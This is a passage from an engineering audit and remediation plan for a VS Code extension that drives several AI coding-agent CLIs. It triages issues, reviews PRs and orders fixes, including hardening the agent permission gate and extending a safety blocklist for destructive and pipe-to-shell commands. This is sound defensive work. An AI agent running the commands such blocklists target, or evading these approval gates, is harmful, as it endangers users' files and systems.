| M | Unconditional scroll-to-bottom on every chunk; no stick-to-bottom guard | `src/webview/webviewContent.ts:15759` |
| M | History load schedules one whole-document Prism+mermaid pass per message; no DOM virtualization | `src/webview/webviewContent.ts:18379` |
| L | ~950KB of webview template strings bundled into the 1.86MB extension.js | `src/webview/webviewContent.ts:16` |
| L | Always-on background timers regardless of feature use | `src/managers/ChannelBridge.ts:144` |
| L | Dependency/cleanup hygiene: unused npm deps, per-delta webview logging, VisualTestManager map never pruned | `package.json:1449` |

---

## GitHub Issues Triage

All 16 open issues, verified against the working tree (details in `github-triage.md`).

| # | Title | Validity | Disposition | Linked code |
|---|---|---|---|---|
| #46 | Project memory reused across workspaces via lexical path | **Valid** (= B19) | Merge **PR #47** + add memory migration, then close | `src/managers/MemoryManager.ts:284-298`; injected via ChatViewProvider `fullSystemContext` |
| #44 | Pending ask replies mis-bound across panels | **Valid** (= B18) | Merge **PR #45 rebased on #43**, then close | `src/managers/ChannelBridge.ts:761-790` (`channelAsks[0]` fallback; `askId`/`panelId` unused) |
| #42 | Cross-channel identity confusion in ChannelBridge | **Valid** (= B17) | Merge **PR #43**, then close | `src/managers/ChannelBridge.ts:865-899` (channel ignored, substring fuzzy match) |
| #41 | Partnership inquiry from MyClaw.ai | Not a code issue | **Close** with contact email | — |
| #40 | OpenCode remote/HTTP mode for Windows+WSL/Docker | Valid feature request | **Backlog** (medium effort; aligns with Windows pain cluster) | `src/providers/opencode/OpenCodeProvider.ts` (CLI-spawn only today) |
| #39 | "Not able to use custom models" | **Needs-info** + one real bug found | Ask reporter for provider/setting/error/version; **fix the qwen-code omission regardless** | Write-side `providerModelKeys` at `ChatViewProvider.ts:~3607` omits `'qwen-code'` (read side at ~448 has it) |
| #36 | Listed in Awesome Codex CLI | Notification only | **Close** (optionally add badge to README) | — |
| #34 | OpenClaw Gateway DEVICE_IDENTITY_REQUIRED | **Valid** | Fix ourselves (medium-large): ed25519 device keypair, sign challenge nonce, include device in connect frame. Gates the entire Active Mode feature set | `src/providers/openclaw/OpenClawGateway.ts:~181-200` (no `device` object; challenge nonce received but never signed) |
| #33 | Agent config not persisted when switching agents | **Valid** | Fix ourselves: persist `providerId → lastSelectedModel` map, restore on switch | `src/providers/ChatViewProvider.ts:~3566-3599` (model overwritten with new provider's default) |
| #32 | Support opus 4.6 1m | **Valid small feature** | Fix ourselves: add dropdown entry; note `[1m]` brackets are rejected by `MODEL_NAME_PATTERN` and package.json patterns, and are shell-glob chars under Windows `shell:true` — add the entry with verified arg escaping rather than widening the regex | `src/providers/claude/ClaudeCodeProvider.ts:60-86`; `src/utils/validation.ts:27` |
| #31 | "Agent silent for 90s — aborting" in brainstorm | **Valid; promised March, undelivered** | Fix ourselves (cheap): raise default to 5-10 min, add `mysti.brainstorm.silenceTimeout` setting, warn instead of abort once output started. Coordinate with the unconfirmed timer-leak finding at `BrainstormManager.ts:838` | `src/constants.ts:80` (`BRAINSTORM_SILENCE_TIMEOUT_MS`); `BrainstormManager._iterateWithSilenceTimeout` |
| #30 | "errors using the cli" Windows EINVAL/ENOENT | **Valid, duplicate** of #14/#27 | Fix via Windows epic, close as dup of #14 | Same root-cause cluster (spawn + PATH/node resolution) |
| #29 | Deploy on Open VSX Registry | Valid, owner committed | **Backlog, low effort**: manual `npx ovsx publish` first, then CI | No `.github/workflows`, no ovsx config exists |
| #28 | Add opened tab/selection to context with quick toggle | **Valid; half-built** | Fix ourselves: feature is dead-ended — `activeFileChanged`/`selectionChanged` are posted but have **zero consumers**; finish webview handlers + auto-inject at send + toggle pill | `src/extension.ts:~499-529` (dead-ended postMessages); `ContextManager.getContext()` |
| #27 | `'"node"' is not a command` on Windows | **Valid; root cause identified** | Fix ourselves: `findNodeDir()` candidates are Unix-only and test for `node` not `node.exe` — add `%ProgramFiles%\nodejs`, `%APPDATA%\npm`, nvm-windows `%NVM_HOME%`/`%NVM_SYMLINK%`, volta. Confirmed persisting post-0.4.0 | `src/utils/platform.ts:304-361` (`findNodeDir`) |
| #14 | `Error: spawn EINVAL` | **Valid; canonical Windows epic** (7 participants, biggest user-pain cluster) | Keep open as umbrella; remaining work: #27 node-dir fix, `.cmd`/`.exe` shim resolution per CLI, arg quoting under cmd.exe, spawn-failure diagnostics (surface resolved path + PATH in the error card). Close #30 (and arguably #27) into it once fixed | `src/providers/base/BaseCliProvider.ts:550,927` (shell:true added in v0.4.0, insufficient); `src/utils/platform.ts` |

---

## Open PRs

All 5 PRs report MERGEABLE/CLEAN against main. None touch files modified by the uncommitted Canvas v2 work except #37.

### PR #43 — "Fix channel-scoped OpenClaw contact tracking" (3em0) — **MERGE FIRST**
Closes #42 (= B17). `ChannelBridge.ts` +77/−22 + new `tests/managers/channelBridge.test.ts` (+170). Adds `channelId`/`channelType` to `TrackedContact`, scoped keys (`id:<channelId>|<identifier>`), channel-enforced `_isTrackedConversation`, new `_matchesInboundChannel` for ask matching. Design is sound; the channel-type fallback for session-polling events retains a smaller same-channel-type surface (documented, acceptable). **Conflicts:** none with working tree or main; **conflicts with PR #45** (same function, same new test file path). Author could not run vitest (Node 18) — run `npm test` on Node 20+ before merge.

### PR #45 — "Fix ambiguous ChannelBridge pending ask replies" (3em0) — **MERGE WITH CHANGES (rebase onto #43)**
Fixes #44 (= B18). Rewrites `_tryMatchPendingAsk` to collect candidates across all panels and require exactly one (sender-aware first, then channel-only); ambiguous replies dropped with a log. Correctly addresses the cross-panel misbinding. **Must be rebased onto #43** (both diff the same main blob of `ChannelBridge.ts` and both add `tests/managers/channelBridge.test.ts` with different content — mergeable individually, not together). Behavior tradeoff: two outstanding asks to the same contact/channel → all replies silently dropped until TTL; acceptable for security, but consider a UI warning or `ask.to`+panel disambiguation before dropping. Recommended: rebase incorporating `_matchesInboundChannel` into the unique-match logic and merge the two test files (in-house if the author doesn't).

### PR #47 — "Fix project memory key isolation" (3em0) — **MERGE WITH CHANGES (add migration)**
Fixes #46 (= B19). `MemoryManager.ts` +19/−1 + new `tests/managers/memoryManager.test.ts` (+72). Hashes `{schema:'mysti-project-memory-v2', canonicalWorkspacePath}` with `fs.realpathSync.native()` (fallback `path.resolve()`), full 64-char SHA-256 dir names. Logic correct; symlink test sensible. **Gap: no migration** — silently orphans every existing user's `~/.mysti/projects/<12-char-hash>/memory/MEMORY.md` on upgrade. Add a one-time migration (if old truncated-hash dir exists and new dir doesn't, move it) or an explicit changelog note. No conflicts with working tree. Run tests on Node 20+.

### PR #37 — "feat: add MiniMax provider support" (octo-patch) — **BACKLOG; rebase after Canvas v2 lands (product call)**
New `MiniMaxProvider.ts` (+342, OpenAI-compatible SSE modeled on LocalAIProvider), package.json (+71/−5), ProviderRegistry/types/BrainstormManager edits, 13 unit tests. Technically clean; key from `mysti.minimaxApiKey` or env; only contacts the configured base URL. **Conflicts with the uncommitted `feature/visual-testing` branch:** both modify `package.json` and `src/types.ts` (`ProviderType` union). If wanted: merge after Canvas v2 lands, rebase, update CLAUDE.md/README provider counts, and verify MiniMax model names are still current (PR is 2 months old). Otherwise park with a comment.

### PR #38 — "feat(skills): add MiniMax-AI/cli as default skill tap" (octo-patch) — **CLOSE (offer plugin/user-tier path)**
One file: `resources/agents/core/skills/mmx-cli.md`. Would be the first vendor-product promotion in the otherwise-generic core skill set, endorses installing a third-party CLI + API key, and overlaps awkwardly with Canvas v2's first-party media generation. Minor format issue (`icon: lab.png`). Close with a friendly note pointing at `~/.mysti/agents/skills/` (user tier) or the wshobson/agents plugin sync; optionally list mmx-cli in README.

**Merge order:** #43 → #45 (rebased, tests merged) → #47 (+migration). Independent of Canvas v2. Run `npm test` on Node 20+ for all three (the author couldn't). Note: CLAUDE.md's "tests not yet implemented" is stale — `tests/` exists and `npm test` runs vitest; add regression tests alongside each batch below.

---

## Remediation Plan

Ordered fix batches. Each item lists the file-level tasks; bug IDs reference the Confirmed Bugs tables. Land Batches 1-2 on `main` (they don't depend on Canvas v2) except the canvas items, which belong on `feature/visual-testing` since `canvasContent.ts`/`CanvasManager.ts` are modified there.

**Ownership convention:** items tagged **"→ owned by `plans/NN-…`"** are specified at full detail in that sibling plan and are listed here only for severity tracking and batch sequencing — **execute them from the owning plan, never from this file**, or two teams will produce duplicate/conflicting patches to the same lines. Plan 00 directly owns only the untagged items: the permission-gate/security fixes (B1, B2, B6), process lifecycle (B3, B4), panel→provider routing (B12, B16), the autonomous safety chain (B13, B14, B15), provider session/lifecycle correctness (B5, B7, B8, B9, B10, B11), chat-layer routing hygiene (B20, B21, B23, B24), rendering security (B22), the Windows epic (#14/#27/#30), PR merges (#43/#45/#47, #37, #38), and issue hygiene.

### Batch 1 — Critical fixes + quick wins (target: days)

1. **Fail-closed permission gate + tool-name normalization (B1, B6)** — the single largest security gap.
   - `src/utils/permissionClassifier.ts`: invert the default (gate unknown tools when mode requires approval); add read-only allowlist; map web tools to `web-request`.
   - `src/providers/gemini/GeminiProvider.ts:307-347`, `qwen/QwenCodeProvider.ts:395-407`, `cursor/CursorProvider.ts:288-299`, `opencode/OpenCodeProvider.ts:302-317`: normalize emitted tool names to the canonical set.
   - `src/providers/copilot/CopilotProvider.ts:432-456`: replace `--allow-all-tools` with deny-by-default (`--deny-tool shell --deny-tool write`) for ask-tier combos.
   - Tests: a conformance test asserting every provider's emitted tool names classify correctly.
2. **Wizard panelId fix (B2)** — `src/providers/ChatViewProvider.ts` (include `panelId` in `showWizard`, default `msg.panelId ?? 'sidebar'`), `src/webview/webviewContent.ts:13688` (`handleShowWizard` sets `state.panelId`).
3. **One-line / contained high-severity fixes:**
   - B15: reorder `getPendingRequest` before `handleResponse` (`ChatViewProvider.ts:4013`).
   - B30: `max_tokens` → `max_completion_tokens` (`ImageGenerationService.ts:138`). → owned by `plans/05-canvas-overhaul.md` Phase 0 (item 6).
   - B27: undo/redo `loadFromJSON(...).then(...)` (`canvasContent.ts:2554, 2579`). → owned by `plans/05-canvas-overhaul.md` Phase 0 (item 2).
   - B26: world→screen snapshot crop + `multiplier: 1/zoom` (`canvasContent.ts:3904-3951`). → owned by `plans/05-canvas-overhaul.md` Phase 0 (item 1).
   - B28: attach `stitchScreenRef` in `sendUnifiedPrompt` (`canvasContent.ts:3606`) + extension fallback. → owned by `plans/05-canvas-overhaul.md` Phase 0 (item 4).
   - B9: Qwen bare `--continue` → `--resume <sessionId>` (`QwenCodeProvider.ts:188`).
4. **Merge the security PR trio**: #43 → #45 (rebased, test files merged) → #47 (+ one-time memory-dir migration). Run `npm test` on Node 20+. Close issues #42, #44, #46. (Fixes B17, B18, B19.)
5. **GitHub quick wins:**
   - #31: brainstorm silence timeout — raise default, add `mysti.brainstorm.silenceTimeout` setting, warn-don't-abort after first output (`src/constants.ts:80`, `BrainstormManager.ts:838`; also fix the per-chunk timer leak while in there). → owned by `plans/02-unified-chat-experience.md` Phase 8 (streaming status / heartbeat); only the brainstorm timer-leak fix stays here.
   - #39 partial: add `'qwen-code': 'qwenCodeModel'` to the write-side `providerModelKeys` (`ChatViewProvider.ts:~3607`); reply to reporter with needs-info questions. (One-line stopgap only — the full #39 fix is owned by `plans/01-automatic-model-updates.md` Phase 2; coordinate before touching the model-key plumbing further.)
   - #32: add `claude-opus-4-6[1m]` dropdown entry with verified arg escaping (`ClaudeCodeProvider.ts:60-86`); do not widen `MODEL_NAME_PATTERN`. (Stopgap only — `plans/01-automatic-model-updates.md` Phase 2 relaxes validation and unblocks #32 structurally; coordinate to avoid conflicting edits to `validation.ts`/`ClaudeCodeProvider.ts:60-86`.)
6. **Issue hygiene:** close #36, #41; close PR #38 with the plugin/user-tier pointer.

### Batch 2 — High-severity structural fixes (target: 1-2 weeks)

1. **Process lifecycle (B3, B4):**
   - New `src/utils/processKill.ts`: `killProcessTree(proc, grace)` using `exitCode === null && signalCode === null`, exit-event timer cleanup.
   - Replace the broken pattern at `BaseCliProvider.ts:673/1032/1161`, `ClineProvider.ts:839`, `CopilotProvider.ts:352`, `ProviderManager.ts:292`; fix the `!proc.killed` cleanup/dispose guards (`BaseCliProvider.ts:203/297/1018/1157`).
   - `BaseCliProvider.ts:852`: set `usedPersistent` on first chunk; cancellation check before single-shot fallback.
2. **Panel→provider routing (B12, B16):**
   - `ProviderManager.ts`: `cancelRequest`/`suspendRequest`/`resumeRequest`/`clearSession`/`disposePersistentProcess` resolve the panel's provider (record `panelId → providerId` at `registerProcess`, or iterate all providers); SIGKILL the tracked handle as backstop.
   - Wire `AgentLifecycleManager.registerProcessPid` from `ProviderManager.registerProcess`; snapshot `hadChildren` before replacing the set (`AgentLifecycleManager.ts:302-310`).
3. **Autonomous safety chain (B13, B14):**
   - `ChatViewProvider.ts:3147`: keep the gate active during autonomous continuations; route gated tools through SafetyClassifier (auto-approve safe / block blocked).
   - `SafetyClassifier.ts:28-67`: reject compound commands before the safe-list; remove `npx`/bare `echo`/`find`; extend the blocklist (`find -delete/-exec`, bare `rm`, pipe-to-shell).
4. **Provider session/lifecycle correctness (B5, B7, B8, B10, B11):**
   - `CopilotProvider.ts:313/386`: drop fabricated `--resume`; only use CLI-issued IDs.
   - `CursorProvider.ts:564-643`: send conversation history (or real resume); remove fake `session_active`.
   - `OpenClawGateway.ts:303-314, 413-421, 774`: runId-scoped event filtering and `agent.stop`.
   - `CodexProvider.ts:344`: full signature + `buildPromptAsync`; delete deprecated sync `buildPrompt` in `BaseCliProvider`.
   - `ClineProvider.ts:908`: `.clinerules/` directory entry instead of file overwrite (or mutex + restore journal).
   - While here: extract the shared `spawnAndStream` harness recommended in `mysti-providers.md` §4.1 (also resolves the refuted-but-latent `autonomousMode` inconsistency and the unconfirmed early-error-listener / finally-kill / Windows-shell findings in one place).
5. **Chat-layer routing hygiene (B20, B21, B23, B24):**
   - `ChatViewProvider.ts`: persist assistant content in a `finally` (flag interrupted); `try/finally` for `_runningPanels` + `markIdle`; clear question timers in `cancelRequest`; per-panel `cancelRequestsForPanel` in PermissionManager; add the `exit_plan_mode` case routing to plan UI.
6. **Rendering security (B22):** bundle DOMPurify into `resources/`, sanitize marked output in `formatContent`; escape `details.filePath` (`webviewContent.ts:16221`) and `item.path` (`:15304`).
7. **Performance quartet (B33, B34, B35, B36)** — **→ owned by `plans/03-performance-optimization.md` Phases 2-4; do not execute from here** (B35 = Phase 2 activation, B34 = Phase 3 §3a cached discovery, B36 = Phase 3 §3b icon de-bloat, B33 = Phase 4 streaming render path):
   - Streaming: 200ms throttle + `highlightAllUnder` + finalize-only mermaid + drop per-chunk logs (`webviewContent.ts:15631-15760, 18370-18399`); optional 30-50ms delta coalescing in `ChatViewProvider`.
   - Wizard probing: parallel + TTL-cached `CliDiscoveryService`; probe only the active provider for initial state (`SetupManager.ts:900`, `ChatViewProvider.ts:404-420, 517-526`).
   - Activation: register UI first, background `Promise.allSettled` init; narrow `activationEvents` (`extension.ts:82`, `ProviderRegistry.ts:106-123`, `package.json:62-82`).
   - Icons: downscale `resources/icons/` to ≤64px or SVG (VSIX 33.8MB → ~3MB).
8. **Canvas remaining highs (B29, B31, B32)** — on `feature/visual-testing`. **→ owned by `plans/05-canvas-overhaul.md` Phase 0 (B29 = item 5, B31 = item 11, B32 = item 7); do not execute from here:**
   - Job tracking: unify action names with `parseUnifiedPrompt`, jobId correlation, clear `_genJobs` on `canvas_error` (`canvasContent.ts:3586-3598`, `CanvasManager.ts:2540-2592`).
   - Iframe sandbox: drop `allow-same-origin`, srcdoc + MessageChannel bridge, bundle React/Babel locally (`canvasContent.ts:5346, 5388, 5992-5994`).
   - Apply-props: send real SVG/code from webview; include current code in the regen prompt (`canvasContent.ts:4458-4460, 4569`; `CodeGenerationService.ts:153-169`).
9. **Windows epic (#14, #27, #30):**
   - `src/utils/platform.ts:304-361`: Windows candidates for `findNodeDir` (`node.exe`, `%ProgramFiles%\nodejs`, `%APPDATA%\npm`, `%NVM_HOME%`/`%NVM_SYMLINK%`, volta).
   - Spawn diagnostics: surface resolved CLI path + PATH in the error card.
   - Verify/extend `.cmd`/`.exe` shim handling per provider (ties into the spawn harness in 2.4); close #30 as dup; update #14 with progress.

### Batch 3 — The rest (mediums, features, backlog)

1. **Verify-and-fix the unconfirmed queue** (tables above), prioritizing: Qwen double-gating (`QwenCodeProvider.ts:396`), shared "Always allow" escalation (`PermissionManager.ts:169`), compaction math + summarization race (`CompactionManager.ts:94/256`), conversation persistence growth (`ConversationManager.ts:613` — strip context contents, cap, debounce), context bucket mismatch (`extension.ts:317`), `/clear` cross-panel clobber (`SlashCommandManager.ts:227`), ChannelBridge poll watermark + name/phone asymmetry, Veo duration/download-auth (`VideoGenerationService.ts:248/312`), canvas first-undo no-op + text-tool coordinates + DESIGN.md overwrite, visual-test report stats (`VisualTestManager.ts:297`), scroll stickiness + history-load highlight batching. (Ownership notes: the Veo duration/download-auth, first-undo, text-tool-coordinates, and DESIGN.md-overwrite items are owned by `plans/05-canvas-overhaul.md` Phase 0 items 8/3/9/13; scroll stickiness and history-load highlight batching are owned by `plans/03-performance-optimization.md` Phase 4 item 6 and Phase 5 item 1 — verify here, fix there.)
2. **Capability-driven unified chat UX (B25):** extend `ProviderCapabilities` (`thinkingStyle`, `emitsToolEvents`, `emitsUsage`, `sessionKind`), post a provider manifest to the webview, replace the 56+38 hard-coded provider-name seams, fix Cursor rejected→completed, define the canonical StreamChunk contract with per-provider conformance tests. Design: `unified-chat-ux.md`. **→ owned by `plans/02-unified-chat-experience.md` Phases 1-3; do not execute from here.**
3. **Promised/half-built features:** #28 auto-context (wire the dead-ended `activeFileChanged`/`selectionChanged` messages, auto-inject at send, toggle pill); #33 per-provider model memory (`providerId → lastSelectedModel` map). **→ owned by `plans/02-unified-chat-experience.md`: #28 = Phase 7 (context affordances), #33 = Phase 6 (per-agent config persistence); do not execute from here.**
4. **Security/storage hardening:** migrate all API keys (`mysti.cursorApiKey`, canvas OpenAI/Gemini/Stitch keys, LocalAI/Manus) to `context.secrets` with one-time migration; stop mutating `process.env`; conversation storage redesign (per-conversation files under `globalStorageUri`, index in globalState). (Ownership split: the canvas-key portion — OpenAI/Gemini/Stitch keys + `process.env` mutation — is owned by `plans/05-canvas-overhaul.md` Phase 0 item 12 (`CanvasSecrets`); the conversation storage redesign is owned by `plans/03-performance-optimization.md` Phase 6. Plan 00 keeps only `mysti.cursorApiKey` and the LocalAI/Manus keys.)
5. **Dead code & docs honesty:** delete or feature-flag ManusProvider (and fix the uncapped poll loop if kept); remove AutocompleteManager or wire it; remove the unreachable canvas batch-generation pipeline and dead chunk types; align capabilities flags with reality (Copilot toolUse, Ollama images, Codex/Cline sessions); update CLAUDE.md (12→11 backends, tests exist).
6. **Model currency:** implement runtime model discovery with cached fallbacks per `model-updates.md` (Ollama `/api/tags`, LocalAI `/v1/models`, `cursor-agent models`, `openclaw models list --json`, `opencode models`, copilot help parsing, codex debug models; curated lists for Gemini/Qwen/Cline; evergreen aliases for Claude); unify the three divergent dropdown semantics; hide or wire the dead dropdowns (Cline, OpenClaw, Ollama, LocalAI). **→ owned in full by `plans/01-automatic-model-updates.md` (Phases 1-5); do not execute from here.**
7. **Backlog features (in rough priority):** #34 OpenClaw device identity (medium-large; unblocks the whole Active Mode/ChannelBridge feature set), #29 Open VSX publish (manual then CI), #40 OpenCode HTTP/serve transport, PR #37 MiniMax provider (decide post-Canvas-v2; rebase over package.json/types.ts).
8. **Canvas architecture (feeds the DeepMyst 2.0 canvas redesign plan):** persist DesignSpec/Stitch refs/theme library in `CanvasSession` instead of webview memory; typed message union + job ids; move `canvasContent.ts` out of the template string; cancellation for canvas generations.
